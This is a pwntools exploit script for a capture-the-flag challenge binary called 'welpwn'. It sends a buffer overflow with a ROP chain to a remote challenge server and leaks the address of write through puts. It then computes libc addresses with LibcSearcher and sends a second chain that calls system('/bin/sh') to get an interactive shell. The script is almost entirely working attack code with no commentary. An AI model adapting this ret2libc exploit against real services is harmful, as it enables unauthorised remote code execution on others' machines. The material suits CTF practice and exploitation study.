from pwn import *
from LibcSearcher import *

# io = remote("192.168.170.128", 1234)
# context.arch = "amd64"

io = remote("61.147.171.105", 53295)
# p = remote("node4.buuoj.cn", 28576)
# io = remote("node4.anna.nssctf.cn", 28341)
# io = process('./find_flag')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('./welpwn')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r():
    return (io.recv())
def ru(a):
    return io.recvuntil(a)
def rl():
    io.recvline()
def sla(a, b):
    p.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()


# context(os='linux', arch='amd64')
# context(os='linux', arch = 'amd64', log_level = "debug")

write_got = elf.got['write']
puts_plt = elf.plt['puts']
pop_4 = 0x40089C
pop_rdi = 0x4008A3

ru('Welcome to RCTF\n')

main_addr = 0x4007CD
payload = b'a'*0x18 + p64(pop_4) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(main_addr)
sl(payload)

ru("\x40")
write_addr = u64(io.recv(6).ljust(8,b'\x00'))
print(hex(write_addr))
libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

ru("\n")
payload = b'a'*0x18 + p64(pop_4) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
sl(payload)

inter()
